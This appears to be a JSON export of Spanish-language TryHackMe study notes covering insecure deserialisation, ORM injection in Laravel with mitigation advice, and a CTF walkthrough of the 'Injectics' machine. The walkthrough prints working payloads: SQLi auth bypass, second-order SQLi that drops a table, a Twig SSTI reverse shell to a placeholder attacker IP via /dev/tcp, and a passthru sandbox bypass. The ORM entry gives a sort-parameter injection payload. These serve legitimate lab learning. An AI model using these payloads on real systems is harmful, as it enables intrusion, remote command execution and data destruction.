[
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "El input proporcionado por el usuario ha sido consistentemente un catalizador para las vulnerabilidades, suponiendo un riesgo persistente para numerosas plataformas y aplicaciones. Otro riesgo no tan entendido pero igualmente peligroso es la deserialización insegura.\n\nLos exploits de deserialización insegura ocurren cuando una aplicación confía en información serializada lo suficiente para usarla sin validar su autenticidad, lo que puede llevar a resultados desastrosos.Este tipo de vulnerabilidad está presente en aplicaciones que serializan y deserializan estructuras complejas de datos a lo largo de varios entornos de programación. como Java, .NET y PHP.\n\n--------------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad ganaremos conocimiento en:\n\n- Cómo funcionan los procesos de serialización y deserialización.\n- Riesgos potenciales de aplicaciones web.\n- Técnicas de explotación.\n- Medidas de mitigación.\n\n--------------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-19T00:59:19"
  },
  {
    "title": "1. Getting the Flags",
    "path": "/apuntes/thm/maquinas/2-medium/8-injectics/1-getting-the-flags/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/1. Getting the Flags.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 8. Injectics",
    "content": "1. Vamos a empezar como siempre, con escaneos:\n\t1. Primero un escaneo a la IP, general.\n\t   ![[Pasted image 20260117123157.png]]\n\t2. Luego un escaneo más profundo a aquellos puertos abiertos.\n\t   ![[Pasted image 20260117123343.png]]\n\t3. Seguimos con enumeración de directorios.\n\t   ![[Pasted image 20260117134945.png]]\n\t4. Vamos a buscar archivos comunes, para ello usamos `dirsearch` que ya prueba algunas extensiones comunes por defecto.\n\t   ![[Pasted image 20260117135831.png]]\n\t5. Miramos el código fuente.\n\t   ![[Pasted image 20260117131123.png]]\n\t   Parece que hemos encontrado un email válido y el archivo donde se guardan estos.\n2. Ahora que tenemos unos cuantos directorios vamos a recopilar información de la aplicación web.\n\t1. Empezando por el archivo `robots.txt`.\n\t   ![[Pasted image 20260117123714.png]]\n\t   No existe por lo que ya lo descartamos.\n\t2. Vamos a ver qué hay en la página principal.\n\t   ![[Pasted image 20260117123816.png]]\n\t   ![[Pasted image 20260117123859.png]]\n\t3. Si buscamos en estos botones, todos nos llevan a `#` menos `Login` que nos lleva a `login.php`.\n\t   ![[Pasted image 20260117124157.png]]\n\t   Volveremos aquí más tarde.\n\t4. Vamos a ver qué vemos por los directorios que habíamos sacado del escaneo de directorios.\n\t   ![[Pasted image 20260117124439.png]]\n\t   La página `phpmyadmin` es la única que no aparece `403 Forbidden`.\n3. Si miramos algunos de los archivos que encontramos con `dirsearch` encontramos lo siguiente.\n   ![[Pasted image 20260117135932.png]]\n   ![[Pasted image 20260117140008.png]]\n   Parece que hemos encontrado el framework de la web.\n4. Vamos a investigar la página `login.php`.\n\t1. Si le damos a `Login as Admin`, nos lleva a la página `adminLogin007.php`.\n\t   ![[Pasted image 20260117124651.png]]\n\t2. Vamos a intentar iniciar sesión en el login normal y ver que pasa con Burp Suite.\n\t   ![[Pasted image 20260117130222.png]]\n\t   Salta esto y ni siquiera llega a salir del cliente.\n\t3. Si investigamos un poco podemos llegar hasta el JS que hace que salte esta alerta.\n\t   ![[Pasted image 20260117130351.png]]\n\t   Aquí podemos ver que si esas palabras están contenidas no nos dejará acceder ni siquiera a la petición de login, al haber puesto \"n**or**mal\" está cogiendo el \"or\" dentro de esta.\n\t4. Cambiamos el Email y volvemos a probar.\n\t   ![[Pasted image 20260117130816.png]]\n\t5. Ahora que ya tenemos la petición, vamos a jugar en Burp Suite.\n\t\t1. Lo primero vamos a ver si el filtro de \"OR\" está sólo del lado del cliente.\n\t\t   ![[Pasted image 20260117130921.png]]\n\t\t   Hemos puesto \"prueban**or**mal\" y nos sale lo mismo que en la petición de arriba, por lo que parece que sí, sólo era un filtro del lado del cliente.\n\t\t2. Vamos a probar a enviar ahora una petición con un correo real: `dev@injectics.thm`.\n\t\t   ![[Pasted image 20260117131359.png]]\n\t\t   Parece que no podemos obtener información de aquí. \n5. Si recordamos el escaneo, había un archivo donde se guardaban los correos: `mail.log`\n   ![[Pasted image 20260117131832.png]]\n   Estas credenciales sólo valdrían si algo le pasara a la tabla `users` por lo que no nos valen.\n6. Vamos a probar diferentes payloads de alguna [lista de github](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/SQL-Injection-Auth-Bypass-Payloads.txt) en el Intruder de Burp Suite. Primero probaremos en el campo email.\n   ![[Pasted image 20260117133044.png]]\n7. Después de esperar un poco obtenemos el payload.\n   ![[Pasted image 20260117133252.png]]\n8. Cambiamos la cookie de sesión `PHPSESSID` al valor hecho en la petición validada y vamos al endpoint que nos marca la respuesta.\n   ![[Pasted image 20260117133650.png]]\n9. Si recordamos lo que decía la página de `mail.log` era que si algo le pasaba a la tabla `users` se habilitarían las cuentas que aparecían allí. Vamos a editar alguna entrada y a corroborar esto.\n   ![[Pasted image 20260117133809.png]]\n   Después de hacer esto e intentar loguearnos como admin parece que nada cambia.\n10. Vamos a intentar introducir un cambio con una query (ataque de segundo orden SQLi).\n   ![[Pasted image 20260117134336.png]]\n   Parece que hay validación, vamos a cambiar el payload.\n11. Probamos ahora a quitar las comillas.\n    ![[Pasted image 20260117134424.png]]\n    Parece que ahora sí nos deja.\n    ![[Pasted image 20260117134447.png]]\n    Y encima se han cambiado todos los oros.\n12. Vamos a borrar la base de datos, por lo que decía en el email.\n    ![[Pasted image 20260117134543.png]]\n    ![[Pasted image 20260117134601.png]]\n13. Vamos ahora a iniciar sesión como admin.\n    ![[Pasted image 20260117134659.png]]\n14. Si recordamos el análisis, el motor de plantillas era twig que permite crear dinamismo mediante etiquetas como `{{ }}`.\n    ![[Pasted image 20260117140315.png]]\n15. Parece que es susceptible de SSTI.\n    ![[Pasted image 20260117140343.png]]\n16. Si probamos ahora a poner `{{ system(\"ls\") }}`, nos salta con:\n    ![[Pasted image 20260117140645.png]]\n17. Encontramos la forma de mandarnos una reverse shell `{{ [\"bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/PUERTO_ATACANTE 0>&1'\"] | map(\"system\") | join }}`.\n\t1. Nos ponemos en escucha.\n\t   ![[Pasted image 20260117141147.png]]\n\t2. Metemos el payload en la plantilla.\n\t   ![[Pasted image 20260117141308.png]]\n\t3. Por desgracia nos salta un error.\n\t   ![[Pasted image 20260117141615.png]]\n18. Después de mucho quebradero de cabeza y de darnos cuenta de que estamos en una sandbox con restricciones (debido a que `passthru` lo pone), llegamos a un payload que funciona: `{{['id','']|sort('passthru')}}`. Aquí creamos un array así `['id', '']`. Después con sort especificamos la función de ordenado, pero esto no comprueba que sea una función de ordenado, solo lo intenta ejecutar. Passthru en PHP ejecuta un comando del sistema operativo y muestra su salida sin procesar.\n    ![[Pasted image 20260117145310.png]]\n    ![[Pasted image 20260117145324.png]]\n19. Listamos el directorio `/flags` sustituyendo `id` por `ls flags`.\n    ![[Pasted image 20260117145453.png]]\n20. Leemos el documento.\n    ![[Pasted image 20260117145558.png]]\n    \n21. Obtenemos la flag.\n    ![[Pasted image 20260117145609.png]]\n\n>[!SUCCESS] Hemos conseguido obtener ambas flags. Para ello hemos tenido que utilizar SQLi de primer y segundo orden para obtener la primera flag y más adelante SSTI para obtener la segunda flag.",
    "modified": "2026-01-18T00:59:42"
  },
  {
    "title": "6. ORM Injection - Vulnerable Implementation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/6-orm-injection-vulnerable-implementation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/6. ORM Injection - Vulnerable Implementation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Aunque las prácticas de programación seguras son esenciales, también es importante reconocer cómo un desarrollador puede implementar sin querer una versión vulnerable de ORM, creando vías para la explotación. Ocurre cuando los desarrolladores usan librerías ORM mal configuradas o antiguas. Los desarrolladores deben asegurarse de estar usando versiones actualizadas y seguras de dichas librerías.\n\n----------------------------------------\n<h2>Ejemplo Práctico</h2>\nUno de estos ejemplos es el paquete de construcción de queries de Laravel, el cual tuvo una vulnerabilidad de seguridad importante en versiones anteriores a la 1.17.1. Esta vulnerabilidad permitía la inyección SQL mediante parámetros query no sanitizados. La vulnerabilidad fue identificada en cómo manejaba el paquete los parámetros de búsqueda sin validación adecuada. Hemos usado el [Spatie query builder](https://github.com/spatie/laravel-query-builder) para este ejemplo, lo que también usa el Laravel's query builder internamente.\n\nPara demostrar esta vulnerabilidad puedes acceder a `https://IP.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/query_users?sort=name`. Este endpoint permite recuperar los usuarios de arriba ordenados por la columna `name` vía el parámetro `sort`.\n\n![[Pasted image 20260116135729.png]]\n\nEl traducción de query equivalente de Laravel es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n\n<h4>Intento de Inyección</h4>\nSi intentamos inyectar el parámetro nombre con `name'`, veremos que la app devuelve un error de que no pudo encontrar el nombre de la columna.\n\n![[Pasted image 20260116142050.png]]\n\nNuestro objetivo aquí es manipular la query para obtener la información completa de la tabla `users` en lugar de ser restringidos a un número de filas.\n\nSin embargo, inyectar el parámetro sort en este contexto no es tan fácil como concatenar el `SELECT` y usar métodos de inyección rutinarios. El reto yace en romper efectivamente la cláusula `ORDER BY` para manipular la ejecución. Para conseguir esto, podemos utilizar una función especial: el operador `->` el cual sirve como alias de la función `json_extract` en MySQL. Este operador nos permite navegar la información JSON y extraer valores específicos. Usando el operador `->` en conjunción con el payload `\"%27))`, podemos romper la cláusula `ORDER BY`. El payload `->\"%27))` termina efectivamente la extracción JSON, bypasseando las limitaciones impuestas por la query inicial y permitiéndonos añadir comandos SQL adicionales.\n\n<h4>Payload Final</h4>\nPrepararemos el payload final de la siguiente manera:\n\n- **Query Inicial:** La query inicial que Laravel traduce para mostrar a los usuarios pertinentes es `SELECT * FROM users ORDER BY name ASC LIMIT 2`.\n- **Rompiendo la Query:** Inyectando `name->\"%27))`, podemos causar la ruptura de la query para crear una oportunidad de inyectar nuestro propio SQL.\n- **Construyendo el Payload:** Para explotar esta vulnerabilidad, construimos el payload para que rompa la string e inyecte el SQL. El payload debería ser algo como `name->\"%27)) SQL INJECTION QUERY #`. En el valor de parámetro `name->`, el operador `->` es parseado por Laravel y reemplazado con la función MySQL JSON. Por otro lado, `\"%27))` cierra la string y condición anteriores. `SQL INJECTION QUERY` permite al atacante escribir su propia query. El carácter `#` comenta el resto de la linea.\n- **Resultado Final:** El payload para obtener las filas adicionales de la base de datos sería `SELECT * FROM 'users' ORDER BY json_unquote(json_extract('name', '$.\"\"')) LIMIT 10#\"')) ASC LIMIT 2`, incluyendo el payload inyectado.\n\n![[Pasted image 20260116143658.png]]",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "7. Best Practices",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/7-best-practices/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/7. Best Practices.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Ahora que entendemos la superficie de ataque de la inyección ORM, prevenir estas vulnerabilidades requiere implementar medidas de seguridad robustas y monitorizar continuamente debilidades potenciales.\n\n--------------------------------------\n<h2>Algunas Prácticas Importantes</h2>\n- **Validación de Input:** Valida siempre el input del usuario del lado del cliente y del lado del servidor. Asegúrate de que la información introducida cumple con formato, tipo y longitud.\n- **Queries Parametrizadas:** Usa queries parametrizadas (prepared statements) para interactuar con la base de datos.\n- **Uso de ORM:** Utiliza las herramientas integradas del ORM para interactuar con la base de datos. \n- **Escapado y Sanitización:** Escapa y sanitiza siempre el input del usuario para eliminar caracteres especiales e información maliciosa.\n- **Lista de Inputs Permitidos:** Implementa un alista para la validación de inputs. Permite sólo específicos (whitelist).\n\n------------------------------------------\n<h2>Aplicación en Frameworks Populares</h2>\nExploraremos prácticas esenciales para salvaguardarnos de la inyección ORM en frameworks ORM populares. Herramientas ORM como Doctrine (PHP), SQLAlchemy (Python), Hibernate (Java) y Entity Framework (.NET) ofrecen abstracciones poderosas para interactuar con bases de datos. Sin embargo, para prevenir vulnerabilidades de inyección SQL, es crucial emplear prácticas de programación segura.\n\n<h4>Doctrine (PHP)</h4>\nUsa statements preparados con queries parametrizadas para prevenir los ataques de inyección SQL.\n\n```php\n$query = $entityManager->createQuery('SELECT u FROM User u WHERE u.username = :username');\n$query->setParameter('username', $username);\n$users = $query->getResult();\n```\n\n<h4>SQLAlchemy (Python)</h4>\nUsa el ORM de SQLAlchemy y Query API para usar queries parametrizadas, que escapan automáticamente.\n\n```python\nfrom sqlalchemy.orm import sessionmaker\nSession = sessionmaker(bind=engine)\nsession = Session()\nuser = session.query(User).filter_by(username=username).first()\n```\n\n<h4>Hibernate</h4>\nUsa parámetros nombrados con la Query API de Hibernate para asegurar que los inputs sean correctamente escapados.\n\n```java\nString hql = \"FROM User WHERE username = :username\";\nQuery query = session.createQuery(hql);\nquery.setParameter(\"username\", username);\nList results = query.list();\n```\n\n<h4>Entity Framework (.NET)</h4>\nEmplea queries parametrizadas en el Entity Framework para securizar las interacciones de la base de datos y mitiga el riesgo de vulnerabilidades de inyección SQL.\n\n```C#\nvar user = context.Users.FirstOrDefault(u => u.Username == username);\n```",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "4. Identifying ORM Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/4-identifying-orm-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/4. Identifying ORM Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Identificar vulnerabilidades ORM involucra examinar cómo el input del usuario se maneja en las queries. Estas vulnerabilidades surgen cuando el input del usuario se incrusta directamente en los métodos query ORM sin sanitizar o validar.\n\n--------------------------------------\n<h2>Técnicas de Comprobación de Inyección ORM</h2>\n- **Revisión de Código Manual:** Una inspección a conciencia del código fuente puede revelar métodos de query raw como `whereRaw()` que incorporan el input directamente. Busca strings concatenadas o inputs no escapados.\n- **Escaneo Automatizado:** Usa herramientas de escaneo de seguridad diseñadas para detectar vulnerabilidades ORMi.\n- **Comprobación de Validación de Input:** Realiza comprobaciones manuales inyectando payloads en los inputs de la aplicación.\n- **Comprobación Basada en Errores:** Introduce información incorrecta o malformada adrede para disparar errores, que pueden revelar detalles de la estructura subyacente.\n\n<h4>Frameworks y Comprobación de Inyección ORM</h4>\n\n| **Framework  <br>** | **Librería ORM** | **Métodos Comúnmente Vulnerables**   |\n| ------------------- | ---------------- | ------------------------------------ |\n| Laravel             | Eloquent ORM     | `whereRaw(), DB::raw()`              |\n| Ruby on Rails       | Active Record    | `where(\"name = '#{input}'\")`         |\n| Django              | Django ORM       | `extra()`, `raw()`                   |\n| Spring              | Hibernate        | `createQuery()` with `concatenation` |\n| Node.js             | Sequelize        | `sequelize.query()`                  |\n\nLa tabla de arriba subraya varios frameworks de desarrollo web y su librería ORM asociada, detallando métodos comunes que son tendentes a vulnerabilidades. Por ejemplo, en Laravel, usando `whereRaw()` o `DB::raw()` con el input del usuario puede llevar a inyección ORM, pero puede prevenirse usando queries parametrizadas con el método `where()`. En Django, de forma similar, métodos como `extra()` y `raw()` pueden introducir vulnerabilidades si no se manejan correctamente.\n\n---------------------------------------------\n<h2>Explorando la Aplicación Objetivo</h2>\nAhora que sabemos cómo identificar vulnerabilidades de inyección ORM, visitemos el sitio `https://IP.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/`. Aquí veremos que el sitio web te pide un input. Para determinar qué framework se usa, podemos emplear varias técnicas como inspeccionar cookies, ver el código fuente o analizar headers HTTP.\n<h4>Técnicas para Identificar el Framework</h4>\n- **Verificar Cookies:** Examina las cookies configuradas por la aplicación. Los frameworks suelen usar convenciones de nombramiento únicas.\n  ![[Pasted image 20260116114511.png]]\n- **Revisar Código Fuente:** Mira en el código fuente HTML en busca de comentarios, etiquetas meta o cualquier script incrustado que pueda revelar firmas específicas de framework.\n  ![[Pasted image 20260116114608.png]]\n- **Analizar headers HTTP:** Los headers HTTP pueden contener a veces información sobre el servidor y el framework.\n- **Estructura URL:** La estructura de las URLs puede dar pistas sobre el framework.\n- **Páginas de Login y Error:** Las páginas de error y autentificación pueden revelar a veces el framework.\n\nAhora que hemos identificado que la aplicación usa Laravel inspeccionando cookies y código fuente, podemos ir más allá poniendo input malicioso para explorar su comportamiento. Específicamente, introduciremos `1'` para ver cómo maneja ese input. Lo introducimos en el campo email (vulnerable) y la mandamos.\n\n![[Pasted image 20260116120810.png]]\n\nDespués de subirla tenemos que observar de cerca el comportamiento de la aplicación. Si la aplicación devuelve un mensaje de error como `SQLSTATE[42000]: Syntax error or access violation` indica que el input ha sido manejado incorrectamente porque lo ha concatenado, resultando en error de sintaxis. El output muestra que usa Laravel's Eloquent ORM ya que los mensajes de error y patrones query son característicos de ello.",
    "modified": "2026-01-17T00:53:14"
  }
]